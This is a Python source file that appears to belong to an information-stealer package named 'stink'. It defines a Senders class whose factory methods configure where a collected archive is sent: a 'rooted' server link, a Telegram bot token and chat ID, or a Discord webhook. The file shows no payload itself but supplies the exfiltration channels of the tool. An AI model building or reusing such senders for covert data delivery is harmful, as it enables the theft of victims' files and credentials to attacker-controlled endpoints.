from stink.utils.senders import Server, Telegram, Discord


class Senders:

    @staticmethod
    def server(server: str) -> Server:
        """
        Creates a sender for the server.

        Parameters:
        - server [str]: A link to the rooted server that accepts the file as input.

        Returns:
        - Server: Server sender object.
        """
        return Server(server=server)

    @staticmethod
    def telegram(token: str, user_id: int) -> Telegram:
        """
        Creates a sender for the Telegram.

        Parameters:
        - token [str]: The token of the bot that will send the archive.
        - user_id [int]: ID of the user or chat room where the bot will send the archive to.

        Returns:
        - Telegram: Telegram sender object.
        """
        return Telegram(token=token, user_id=user_id)

    @staticmethod
    def discord(webhook: str) -> Discord:
        """
        Creates a sender for the Discord.

        Parameters:
        - webhook [str]: Hook of the Discord bot.

        Returns:
        - Discord: Discord sender object.
        """
        return Discord(webhook=webhook)
